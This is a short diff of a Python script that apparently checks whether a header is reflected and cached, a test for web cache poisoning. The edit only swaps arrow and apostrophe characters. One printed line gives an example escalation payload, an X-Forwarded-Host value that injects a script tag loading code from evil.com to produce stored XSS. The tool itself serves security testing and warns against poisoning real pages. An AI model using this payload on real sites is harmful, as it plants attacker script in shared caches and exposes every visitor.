@@ -62,15 +62,15 @@ def main():
 
     print()
     if reflected and served:
-        print("[POISONED] the marker injected via the header is served on a CLEAN request to the same key →")
-        print("           UNKEYED + cacheable → WEB CACHE POISONING. Escalate the marker to a real payload:")
-        print('           e.g.  X-Forwarded-Host: a."><script src=//evil.com/x.js></script>   → stored XSS for all (§12).')
-        print("           (Prove on this benign key; DESCRIBE shared-cache impact. Don’t poison real pages.)")
+        print("[POISONED] the marker injected via the header is served on a CLEAN request to the same key ->")
+        print("           UNKEYED + cacheable -> WEB CACHE POISONING. Escalate the marker to a real payload:")
+        print('           e.g.  X-Forwarded-Host: a."><script src=//evil.com/x.js></script>   -> stored XSS for all (§12).')
+        print("           (Prove on this benign key; DESCRIBE shared-cache impact. Don't poison real pages.)")
     elif reflected and (cs1 or cs2):
         print("[MAYBE] reflected + cache headers present but poison not yet served back. Confirm the header is unkeyed")
         print("        with Burp Param Miner, vary the key, and retry. (§12)")
     elif reflected:
-        print("[INFO] reflected but no caching observed → reflected-host XSS angle (§10), not cache poisoning.")
+        print("[INFO] reflected but no caching observed -> reflected-host XSS angle (§10), not cache poisoning.")
     else:
         print("[*] header not reflected on this endpoint. Try another page, another header, or the reset/routing sinks.")
 
